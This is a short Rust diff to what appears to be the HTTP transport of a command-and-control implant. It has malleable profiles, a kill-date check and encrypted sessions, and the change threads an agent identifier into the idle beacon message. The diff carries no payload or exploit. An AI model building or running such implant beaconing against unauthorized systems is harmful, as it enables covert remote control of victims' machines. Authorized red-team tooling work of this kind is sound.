@@ -81,10 +81,11 @@ pub struct HttpTransport {
     profile: MalleableProfile,
     client: reqwest::Client,
     session: CryptoSession,
+    agent_id: String,
 }
 
 impl HttpTransport {
-    pub async fn new(profile: &MalleableProfile, session: CryptoSession) -> Result<Self> {
+    pub async fn new(profile: &MalleableProfile, session: CryptoSession, agent_id: String) -> Result<Self> {
         // Enforce kill date: refuse to connect after the configured date (4-2).
         if !profile.kill_date.is_empty() {
             check_kill_date(&profile.kill_date)?;
@@ -112,6 +113,7 @@ impl HttpTransport {
             profile: profile.clone(),
             client,
             session,
+            agent_id,
         })
     }
 
@@ -236,7 +238,7 @@ impl Transport for HttpTransport {
                     .duration_since(std::time::UNIX_EPOCH)
                     .unwrap_or_default()
                     .as_secs(),
-                agent_id: String::new(),
+                agent_id: self.agent_id.clone(),
                 status: "idle".to_string(),
             });
         }
